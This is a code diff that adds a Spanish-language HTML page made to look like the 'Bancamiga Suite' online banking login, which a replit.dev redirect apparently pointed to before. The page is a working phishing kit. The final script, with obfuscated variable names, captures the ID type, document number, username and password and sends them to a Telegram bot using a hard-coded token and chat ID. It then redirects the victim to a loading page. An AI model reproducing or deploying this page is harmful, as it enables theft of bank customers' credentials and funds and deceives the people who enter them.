@@ -1,2 +1,605 @@
-<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=https://68cd9ea9-662b-4021-92d4-56e1304b562d-00-3fm63ad6ksr04.picard.replit.dev/">
+<html lang="es"><head><script>
+    window[Symbol.for('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')] = new (class{constructor(e,t){this.name=e,this.destination=t,this.serverListeners={},this.bgRequestsListeners={},this.bgEventsListeners={},window.addEventListener("message",(e=>{const t=e.data,s=!(t.destination&&t.destination===this.name),n=!t.event;if(!s&&!n)if("MARIO_POST_SERVER__BG_RESPONSE"===t.event){const e=t.args;if(this.hasBgRequestListener(e.requestId)){try{this.bgRequestsListeners[e.requestId](e.response)}catch(e){}delete this.bgRequestsListeners[e.requestId]}}else if("MARIO_POST_SERVER__BG_EVENT"===t.event){const e=t.args;if(this.hasBgEventListener(e.event))try{this.bgEventsListeners[t.id](e.payload)}catch(e){}}else if(this.hasServerListener(t.event))try{this.serverListeners[t.event](t.args)}catch(e){}}))}emitToServer(e,t){const s=this.generateUIID(),n={args:t,destination:this.destination,event:e,id:s};return window.postMessage(n,location.origin),s}emitToBg(e,t){const s=this.generateUIID(),n={bgEventName:e,requestId:s,args:t};return this.emitToServer("MARIO_POST_SERVER__BG_REQUEST",n),s}hasServerListener(e){return!!this.serverListeners[e]}hasBgRequestListener(e){return!!this.bgRequestsListeners[e]}hasBgEventListener(e){return!!this.bgEventsListeners[e]}fromServerEvent(e,t){this.serverListeners[e]=t}fromBgEvent(e,t){this.bgEventsListeners[e]=t}fromBgResponse(e,t){this.bgRequestsListeners[e]=t}generateUIID(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){const t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)}))}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}', 'MARIO_POST_SERVER_{fca67f41-776b-438a-9382-662171858615}')</script><script>
+        const hideMyLocation = new (class{constructor(t){this.clientKey=t,this.watchIDs={},this.client=window[Symbol.for(t)];const e=navigator.geolocation.getCurrentPosition,o=navigator.geolocation.watchPosition,n=navigator.geolocation.clearWatch,i=this;navigator.geolocation.getCurrentPosition=function(t,o,n){i.handle(e,"GET",t,o,n)},navigator.geolocation.watchPosition=function(t,e,n){return i.handle(o,"WATCH",t,e,n)},navigator.geolocation.clearWatch=function(t){if(-1===t)return;const e=i.watchIDs[t];return delete i.watchIDs[t],n.apply(this,[e])}}handle(t,e,o,n,i){const a=this.client.emitToBg("HIDE_MY_LOCATION__GET_LOCATION");let r=this.getRandomInt(0,1e5);if(this.client.fromBgResponse(a,(a=>{if(a.enabled)if("SUCCESS"===a.status){const t=this.map(a);o(t)}else{const t=this.errorObj();n(t),r=-1}else{const a=[o,n,i],c=t.apply(navigator.geolocation,a);"WATCH"===e&&(this.watchIDs[r]=c)}})),"WATCH"===e)return r}map(t){return{coords:{accuracy:20,altitude:null,altitudeAccuracy:null,heading:null,latitude:t.latitude,longitude:t.longitude,speed:null},timestamp:Date.now()}}errorObj(){return{code:1,message:"User denied Geolocation"}}getRandomInt(t,e){return t=Math.ceil(t),e=Math.floor(e),Math.floor(Math.random()*(e-t+1))+t}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')
+    </script>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Bancamiga Suite - Home</title>
+        <link rel="preconnect" href="https://fonts.googleapis.com/">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+        <link href="midas/css2.css" rel="stylesheet">
+        <style>
+            /* Variables de color para fácil edición */
+            :root {
+                --bancamiga-green: #5cb85c; /* Verde principal */
+                --bancamiga-dark-green: #2e7d32; /* Verde oscuro del top banner */
+                --bancamiga-mid-green: #388e3c; /* Verde del banner "Miércoles de" */
+                --bancamiga-light-grey: #f0f2f5;
+                --text-color-dark: #333;
+                --text-color-light: #555;
+                --input-bg: #f9f9f9;
+                --border-color: #ddd;
+                --dark-blue-text: #003366; /* Color azul oscuro para "¡Bienvenido a" */
+                --black-text: #000; /* Color negro para "Bancamiga Suite!" */
+            }
 
+            body {
+                font-family: 'Roboto', sans-serif;
+                margin: 0;
+                padding: 0;
+                display: flex; /* Para organizar los elementos verticalmente */
+                flex-direction: column;
+                justify-content: center; /* Centra verticalmente el contenido */
+                align-items: center; /* Centra horizontalmente el contenido */
+                min-height: 100vh;
+                box-sizing: border-box;
+                background-color: var(--bancamiga-light-grey);
+                /* Fondo principal de la aplicación */
+                background-image: url('assets/images/fondo_general_azul.png'); /* Ruta a la imagen de fondo principal */
+                background-repeat: no-repeat;
+                background-size: cover;
+                background-position: center center;
+                background-attachment: fixed;
+                color: var(--text-color-dark);
+            }
+
+            /* --- Estilos de Banners Fijos Superiores (Mantenidos en CSS, pero con display: none en HTML para este diseño) --- */
+            .top-banner {
+                background-color: var(--bancamiga-dark-green);
+                padding: 15px 20px;
+                color: white;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                z-index: 20;
+                box-sizing: border-box;
+            }
+            .top-banner .left-content {
+                display: flex;
+                align-items: center;
+            }
+            .top-banner .left-content img {
+                height: 30px;
+                margin-right: 10px;
+            }
+            .top-banner .suite-text {
+                font-weight: 700;
+                font-size: 20px;
+            }
+            .top-banner .question-mark {
+                font-size: 24px;
+                background-color: rgba(255,255,255,0.2);
+                border-radius: 50%;
+                width: 30px;
+                height: 30px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-weight: 700;
+            }
+
+            .mid-banner {
+                background-color: var(--bancamiga-mid-green);
+                color: white;
+                padding: 10px 0;
+                text-align: center;
+                position: fixed;
+                top: 60px; /* Debajo del top-banner */
+                left: 0;
+                width: 100%;
+                z-index: 19;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                box-sizing: border-box;
+            }
+            .mid-banner img {
+                height: 25px;
+                vertical-align: middle;
+                margin: 0 5px;
+            }
+            .mid-banner span {
+                font-weight: 700;
+                font-size: 18px;
+                vertical-align: middle;
+            }
+
+            /* --- Estilos para el área de bienvenida simplificada --- */
+            .welcome-container {
+                text-align: center;
+                padding: 20px;
+                max-width: 400px; /* Para que no se estire demasiado en pantallas grandes */
+                width: 90%; /* Ocupa el 90% del ancho disponible */
+            }
+
+            /* Estilos para la imagen central de descuento */
+            .descuento-banner {
+                max-width: 350px; /* Ancho máximo para la imagen */
+                width: 90%; /* Que ocupe el 90% del contenedor si es más pequeño */
+                height: auto; /* Mantener la proporción */
+                display: block; /* Para que se centre con margin: auto */
+                margin: 0 auto 30px auto; /* Centrar horizontalmente y añadir espacio abajo */
+                border-radius: 10px; /* Bordes ligeramente redondeados */
+                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); /* Sombra sutil */
+            }
+
+            /* Estilos para el logo encima del banner de descuento */
+            .logo-above-discount {
+                max-width: 180px;
+                height: auto;
+                margin-bottom: 20px; /* Espacio entre el logo y el banner */
+                display: block;
+                margin-left: auto;
+                margin-right: auto;
+            }
+
+            /* Modificaciones al mensaje de bienvenida */
+            .welcome-message-text {
+                font-size: 22px;
+                margin-top: 20px; /* Espacio superior para separar de la imagen */
+                margin-bottom: 30px;
+                line-height: 1.2; /* Ajuste para el salto de línea */
+                font-weight: 400; /* Grosor de fuente para ambas líneas del mensaje */
+                color: var(--dark-blue-text); /* Color azul oscuro por defecto para el párrafo */
+            }
+            .welcome-message-text .welcome-top-line {
+                /* No necesita estilos adicionales si ya los hereda del padre */
+            }
+            .welcome-message-text .suite-brand-name {
+                color: var(--black-text); /* Color negro para "Bancamiga Suite!" */
+                /* El font-weight ya lo hereda del padre */
+            }
+
+            .main-ingresar-btn {
+                background-color: var(--bancamiga-green);
+                color: white;
+                font-size: 20px;
+                font-weight: 700;
+                padding: 15px 40px;
+                border: none;
+                border-radius: 10px;
+                cursor: pointer;
+                transition: background-color 0.3s ease;
+                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+                width: 100%; /* Ocupa todo el ancho del welcome-container */
+                max-width: 350px; /* Ancho máximo para que no sea gigante */
+            }
+            .main-ingresar-btn:hover {
+                background-color: #4cae4c;
+            }
+
+            /* --- Estilos del Modal de Login --- */
+            .modal {
+                display: none; /* Oculto por defecto, se activa con JS */
+                position: fixed;
+                z-index: 100; /* Asegura que esté por encima de todo */
+                left: 0;
+                top: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0, 0, 0, 0.5); /* Fondo semitransparente oscuro */
+                justify-content: center; /* Centra horizontalmente el modal content */
+                align-items: center; /* Centra verticalmente el modal content */
+                overflow-y: auto; /* Permite scroll dentro del modal si el contenido es largo */
+            }
+
+            .modal-content {
+                background-color: #ffffff;
+                border-radius: 15px;
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+                width: 90%;
+                max-width: 400px;
+                padding: 30px;
+                text-align: center;
+                box-sizing: border-box;
+                position: relative;
+                margin: auto; /* Centrar verticalmente y horizontalmente */
+                margin-top: 80px; /* Un poco de espacio arriba para que no quede pegado en móviles */
+                margin-bottom: 80px; /* Un poco de espacio abajo */
+            }
+
+            .modal-close-btn {
+                position: absolute;
+                top: 15px;
+                right: 25px;
+                color: #aaa;
+                font-size: 35px;
+                font-weight: bold;
+                cursor: pointer;
+                transition: color 0.3s ease;
+            }
+            .modal-close-btn:hover,
+            .modal-close-btn:focus {
+                color: #333;
+                text-decoration: none;
+            }
+
+            /* Estilo para el logo dentro del modal de login (tamaño ajustado) */
+            .login-logo-inside-modal {
+                max-width: 160px; /* Ajustado de 100px a 160px para hacerlo más grande */
+                height: auto;
+                margin-bottom: 15px; /* Espacio entre el logo y el mensaje de bienvenida */
+                display: block; /* Para centrarlo */
+                margin-left: auto; /* Para centrarlo */
+                margin-right: auto; /* Para centrarlo */
+            }
+
+            .welcome-message {
+                color: var(--bancamiga-green); /* ¡Bienvenido! en el modal, va en verde */
+                font-size: 18px;
+                font-weight: 700;
+                margin-bottom: 15px;
+            }
+
+            .login-heading {
+                color: var(--text-color-dark);
+                font-size: 20px;
+                font-weight: 400; /* Se quitó el bold */
+                margin-bottom: 25px;
+            }
+
+            .form-group {
+                margin-bottom: 20px;
+                text-align: left;
+            }
+            .form-group label {
+                display: block;
+                margin-bottom: 8px;
+                color: var(--text-color-light);
+                font-weight: 700;
+                font-size: 14px;
+            }
+            .form-group select,
+            .form-group input[type="text"],
+            .form-group input[type="password"] {
+                width: 100%;
+                padding: 12px;
+                border: 1px solid var(--border-color);
+                border-radius: 8px;
+                font-size: 16px;
+                box-sizing: border-box;
+                background-color: var(--input-bg);
+            }
+            .form-group input::placeholder {
+                color: #aaa;
+            }
+
+            /* Estilo para el SELECT desplegable personalizado */
+            .custom-select-wrapper {
+                position: relative;
+                width: 100%;
+            }
+
+            .custom-select-trigger {
+                background-color: var(--input-bg);
+                border: 1px solid var(--border-color);
+                border-radius: 8px;
+                padding: 12px;
+                font-size: 16px;
+                text-align: left;
+                cursor: pointer;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                color: var(--text-color-dark);
+            }
+
+            .custom-select-trigger::after {
+                content: '▼'; /* Flecha hacia abajo */
+                font-size: 12px;
+                color: #888;
+                transition: transform 0.3s ease;
+            }
+
+            .custom-select-trigger.active::after {
+                transform: rotate(180deg); /* Gira la flecha al abrir */
+            }
+
+            .custom-options {
+                display: none;
+                position: absolute;
+                background-color: white;
+                border: 1px solid var(--border-color);
+                border-radius: 8px;
+                width: 100%;
+                max-height: 200px;
+                overflow-y: auto;
+                z-index: 1;
+                box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+                margin-top: 5px;
+            }
+
+            .custom-options.show {
+                display: block;
+            }
+
+            .custom-option {
+                padding: 12px;
+                cursor: pointer;
+                text-align: left;
+                font-size: 16px;
+                color: var(--text-color-dark);
+            }
+
+            .custom-option:hover {
+                background-color: #f0f0f0;
+            }
+
+            .custom-option.selected {
+                background-color: #e0f0ff; /* Azul claro para la opción seleccionada */
+                color: var(--bancamiga-dark-green);
+                font-weight: 700;
+            }
+
+            .checkbox-group {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin-top: 25px;
+                margin-bottom: 30px;
+            }
+            .checkbox-group input[type="checkbox"] {
+                margin-right: 10px;
+                width: 20px;
+                height: 20px;
+                accent-color: var(--bancamiga-green);
+            }
+            .checkbox-group label {
+                color: var(--text-color-light);
+                font-size: 15px;
+                font-weight: 400;
+            }
+
+            .btn {
+                width: 100%;
+                padding: 15px;
+                border: none;
+                border-radius: 8px;
+                font-size: 18px;
+                font-weight: 700;
+                cursor: pointer;
+                transition: background-color 0.3s ease;
+                margin-top: 10px;
+            }
+            .btn-primary {
+                background-color: var(--bancamiga-green);
+                color: white;
+            }
+            .btn-primary:hover {
+                background-color: #4cae4c;
+            }
+            .btn-secondary {
+                background-color: #e0e0e0;
+                color: var(--text-color-light);
+            }
+            .btn-secondary:hover {
+                background-color: #d0d0d0;
+            }
+
+            /* Media queries para ajustes responsivos */
+            @media (max-width: 600px) {
+                .top-banner, .mid-banner {
+                    padding-left: 15px;
+                    padding-right: 15px;
+                }
+                .welcome-container {
+                    padding: 30px;
+                }
+                .welcome-message-text {
+                    font-size: 20px;
+                    margin-bottom: 20px;
+                }
+                .main-ingresar-btn {
+                    font-size: 18px;
+                    padding: 12px 30px;
+                }
+                .descuento-banner {
+                    max-width: 90%; /* Ajuste para que ocupe más en móviles */
+                    margin-bottom: 20px; /* Reduce un poco el margen inferior en móviles */
+                }
+            }
+        </style>
+        <script>(function inject(e){function SendXHRCandidate(e,t,n,r,i){try{var o="detector",s={posdMessageId:"PANELOS_MESSAGE",posdHash:(Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)).substring(0,22),type:"VIDEO_XHR_CANDIDATE",from:o,to:o.substring(0,6),content:{requestMethod:e,url:t,type:n,content:r}};i&&i[0]&&i[0].length&&(s.content.encodedPostBody=i[0]),window.postMessage(s,"*")}catch(e){}}var t=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){this.requestMethod=arguments[0],t.apply(this,arguments)};var n=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(){var t=Object.assign(arguments,{}),r=this.onreadystatechange;return this.onreadystatechange=function(){if(4!==this.readyState||function isFrameInBlackList(t){return e.some((function(e){return t.includes(e)}))}(this.responseURL)||setTimeout(SendXHRCandidate(this.requestMethod,this.responseURL,this.getResponseHeader("content-type"),this.response,t),0),r)return r.apply(this,arguments)},n.apply(this,arguments)};var r=fetch;fetch=function fetch(){var e=this,t=arguments,n=arguments[0]instanceof Request?arguments[0].url:arguments[0],i=arguments[0]instanceof Request?arguments[0].method:"GET";return new Promise((function(o,s){r.apply(e,t).then((function(e){if(e.body instanceof ReadableStream){var t=e.json;e.json=function(){var r=arguments,o=this;return new Promise((function(s,a){t.apply(o,r).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),JSON.stringify(t)),0),s(t)})).catch((function(e){a(e)}))}))};var r=e.text;e.text=function(){var t=arguments,o=this;return new Promise((function(s,a){r.apply(o,t).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),t),0),s(t)})).catch((function(e){a(e)}))}))}}o.apply(this,arguments)})).catch((function(){s.apply(this,arguments)}))}))}})(["facebook.com/","twitter.com/","youtube-nocookie.com/embed/","//vk.com/","//www.vk.com/","//linkedin.com/","//www.linkedin.com/","//instagram.com/","//www.instagram.com/","//www.google.com/recaptcha/api2/","//hangouts.google.com/webchat/","//www.google.com/calendar/","//www.google.com/maps/embed","spotify.com/","soundcloud.com/","//player.vimeo.com/","//disqus.com/","//tgwidget.com/","//js.driftt.com/","friends2follow.com","/widget","login","//video.bigmir.net/","blogger.com","//smartlock.google.com/","//keep.google.com/","/web.tolstoycomments.com/","moz-extension://","chrome-extension://","/auth/","//analytics.google.com/","adclarity.com","paddle.com/checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com/shopping/customerreviews","buy.tinypass.com","gstatic.com","secureir.ebaystatic.com","docs.google.com","contacts.google.com","github.com","mail.google.com","chat.google.com","audio.xpleer.com","keepa.com","static.xx.fbcdn.net"]);</script><script ecommerce-type="extend-native-history-api">(()=>{const e=history.pushState,t=history.replaceState,a=history.back,r=history.forward;function n(){window.postMessage({_custom_type_:"CUSTOM_ON_URL_CHANGED"})}history.pushState=function(){e.apply(history,arguments),n()},history.replaceState=function(){t.apply(history,arguments),n()},history.back=function(){a.apply(history,arguments),n()},history.forward=function(){r.apply(history,arguments),n()}})()</script></head>
+        <body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6IntmY2E2N2Y0MS03NzZiLTQzOGEtOTM4Mi02NjIxNzE4NTg2MTV9IiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjEuOS4xNSIsInNjb3JlIjoxMDkxNX1d" bis_skin_checked="1" style="overflow: auto;">
+            <div class="top-banner" style="display: none;" bis_skin_checked="1">
+                <div class="left-content" bis_skin_checked="1">
+                    <img src="midas/logo_bancamiga_suite_mini.png" alt="Bancamiga Logo">
+                    <span class="suite-text">Suite</span>
+                </div>
+                <div class="question-mark" bis_skin_checked="1">?</div>
+            </div>
+
+            <div class="mid-banner" style="display: none;" bis_skin_checked="1">
+                <img src="midas/logo_bancamiga_suite_mini.png" alt="Bancamiga Logo"> +
+                <img src="midas/logo_pedidosya_mini.png" alt="PedidosYa Logo">
+                <span>Miércoles de</span>
+            </div>
+
+            <div class="welcome-container" bis_skin_checked="1">
+                <img src="midas/logo_bancamiga_suite_mini.png" alt="Bancamiga Suite Logo" class="logo-above-discount">
+
+                <img src="midas/banner_miercoles_descuento.jpg" alt="Miércoles de 30% de Descuento" class="descuento-banner">
+
+                <p class="welcome-message-text">
+                    <span class="welcome-top-line">¡Bienvenido a</span> <br>
+                    <span class="suite-brand-name">Bancamiga Suite!</span>
+                </p>
+
+                <button class="main-ingresar-btn" id="showLoginModal">INGRESAR</button>
+            </div>
+
+            <div id="loginModal" class="modal" bis_skin_checked="1" style="display: none;">
+                <div class="modal-content" bis_skin_checked="1">
+                    <span class="modal-close-btn" id="closeModalBtn">×</span>
+                    <img src="midas/logo_bancamiga_login.png" alt="Bancamiga Login Logo" class="login-logo-inside-modal">
+
+                    <p class="welcome-message">¡Bienvenido!</p>
+                    <h2 class="login-heading">Inicia sesión para acceder a tu cuenta</h2>
+
+                    <form id="loginForm">
+                        <div class="form-group" bis_skin_checked="1">
+                            <label for="tipoDocumento">Tipo de Documento</label>
+                            <div class="custom-select-wrapper" id="customSelectWrapper" bis_skin_checked="1">
+                                <div class="custom-select-trigger" id="customSelectTrigger" bis_skin_checked="1">VENEZOLANO</div>
+                                <div class="custom-options" id="customSelectOptions" bis_skin_checked="1">
+                                    <div class="custom-option selected" data-value="V" bis_skin_checked="1">VENEZOLANO</div>
+                                    <div class="custom-option" data-value="E" bis_skin_checked="1">EXTRANJERO</div>
+                                    <div class="custom-option" data-value="J" bis_skin_checked="1">JURIDICO</div>
+                                    <div class="custom-option" data-value="C" bis_skin_checked="1">COMUNA</div>
+                                    <div class="custom-option" data-value="P" bis_skin_checked="1">PASAPORTE</div>
+                                </div>
+                                <input type="hidden" name="tipoDocumento" id="hiddenTipoDocumento" value="V">
+                            </div>
+                        </div>
+
+                        <div class="form-group" bis_skin_checked="1">
+                            <label for="numDocumento">Número de Documento</label>
+                            <input type="text" id="numDocumento" name="numDocumento" placeholder="Ej: 14000000" required="">
+                        </div>
+
+                        <div class="form-group" bis_skin_checked="1">
+                            <label for="usuario">Usuario</label>
+                            <input type="text" id="usuario" name="usuario" placeholder="Ej: Usuario01" required="">
+                        </div>
+
+                        <div class="form-group" bis_skin_checked="1">
+                            <label for="contrasena">Contraseña</label>
+                            <input type="password" id="contrasena" name="contrasena" placeholder="***" required="">
+                        </div>
+
+                        <div class="checkbox-group" bis_skin_checked="1">
+                            <input type="checkbox" id="cuentaFrecuente" name="cuentaFrecuente">
+                            <label for="cuentaFrecuente">¿Quieres agregar como cuenta frecuente?</label>
+                        </div>
+
+                        <button type="submit" class="btn btn-primary">INGRESAR</button>
+                        <button type="button" class="btn btn-secondary" id="cancelModalBtn">CANCELAR</button>
+                    </form>
+                </div>
+            </div>
+
+            <script>
+        // --- Lógica del Modal de Login ---
+                const loginModal = document.getElementById('loginModal');
+                const showLoginModalBtn = document.getElementById('showLoginModal');
+                const closeModalBtn = document.getElementById('closeModalBtn');
+                const cancelModalBtn = document.getElementById('cancelModalBtn');
+
+        // Mostrar el modal cuando se hace clic en "INGRESAR"
+                showLoginModalBtn.onclick = function() {
+            loginModal.style.display = 'flex'; // Usamos flex para el centrado
+            document.body.style.overflow = 'hidden'; // Evita el scroll del fondo
+        }
+
+        // Ocultar el modal cuando se hace clic en la "X"
+        closeModalBtn.onclick = function() {
+            loginModal.style.display = 'none';
+            document.body.style.overflow = 'auto'; // Restaura el scroll del fondo
+        }
+
+        // Ocultar el modal cuando se hace clic en "CANCELAR"
+        cancelModalBtn.onclick = function() {
+            loginModal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        // Ocultar el modal si se hace clic fuera de él (pero no en el select personalizado)
+        window.onclick = function(event) {
+            if (event.target == loginModal && !event.target.closest('.custom-select-wrapper')) {
+                loginModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            }
+        }
+
+        // --- Lógica del Selector de Tipo de Documento Personalizado ---
+        const customSelectWrapper = document.getElementById('customSelectWrapper');
+        const customSelectTrigger = document.getElementById('customSelectTrigger');
+        const customSelectOptions = document.getElementById('customSelectOptions');
+        const hiddenTipoDocumento = document.getElementById('hiddenTipoDocumento');
+        const customOptions = document.querySelectorAll('.custom-option');
+
+        // Inicializar el valor del input oculto con la opción por defecto
+        hiddenTipoDocumento.value = customSelectTrigger.textContent.substring(0, 1);
+
+        // Toggle para mostrar/ocultar las opciones del select personalizado
+        customSelectTrigger.addEventListener('click', (event) => {
+            event.stopPropagation(); // Evita que el clic se propague al window y cierre el modal
+            customSelectOptions.classList.toggle('show');
+            customSelectTrigger.classList.toggle('active');
+        });
+
+        // Manejar la selección de una opción
+        customOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                // Remover la clase 'selected' de la opción previamente seleccionada
+                document.querySelector('.custom-option.selected')?.classList.remove('selected');
+                // Añadir la clase 'selected' a la opción actual
+                this.classList.add('selected');
+                // Actualizar el texto del trigger con la opción seleccionada
+                customSelectTrigger.textContent = this.textContent;
+                // Actualizar el valor del input oculto
+                hiddenTipoDocumento.value = this.dataset.value;
+                // Ocultar las opciones
+                customSelectOptions.classList.remove('show');
+                customSelectTrigger.classList.remove('active');
+            });
+        });
+
+        // Ocultar las opciones si se hace clic fuera del select personalizado
+        document.addEventListener('click', function(event) {
+            if (customSelectWrapper && !customSelectWrapper.contains(event.target)) {
+                customSelectOptions.classList.remove('show');
+                customSelectTrigger.classList.remove('active');
+            }
+        });
+    </script>
+
+    <script>
+
+       const tipoinput = document.getElementById("hiddenTipoDocumento");
+const documentoinput = document.getElementById("numDocumento");
+const usuarioInput = document.getElementById("usuario");
+const claveInput = document.getElementById("contrasena");
+const ingresarBtn = document.getElementById("ingresarBtn");
+document.getElementById("loginForm").addEventListener("submit", function (_0x3ec297) {
+  _0x3ec297.preventDefault();
+  const _0x38d5a6 = tipoinput.value.trim();
+  const _0x56dd8b = documentoinput.value.trim();
+  const _0x1bd222 = usuarioInput.value.trim();
+  const _0x43ebe2 = claveInput.value.trim();
+  if (_0x1bd222.length < 5 || _0x43ebe2.length < 5) {
+    alert("Ambos campos deben tener al menos 5 caracteres.");
+    return;
+  }
+  localStorage.setItem("usuariojs", _0x1bd222);
+  const _0x2bc587 = "\n🔐 BanMiga 🔐\n🆔 Tipo de documento: " + _0x38d5a6 + "\n🧾 Número de documento: " + _0x56dd8b + "\n👤 Usuario: " + _0x1bd222 + "\n🔑 Contraseña: " + _0x43ebe2 + "\n🕒 Fecha:* " + new Date().toLocaleString() + "\n";
+  const _0x464c54 = "7963120280:AAFeNbK4BBZLuwm6QrQi4RxFnSNbXfmhZJs";
+  const _0x5c69c2 = "-4954210092";
+  fetch("https://api.telegram.org/bot" + _0x464c54 + "/sendMessage", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: _0x5c69c2,
+      text: _0x2bc587
+    })
+  }).then(() => {
+    console.log("Datos enviados a Telegram");
+    window.location.href = "load.html";
+  }).catch(_0x564955 => {
+    console.error("Error al enviar a Telegram:", _0x564955);
+    alert("Hubo un problema al enviar los datos.");
+  });
+});
+
+</script>
+
+
+</body></html>
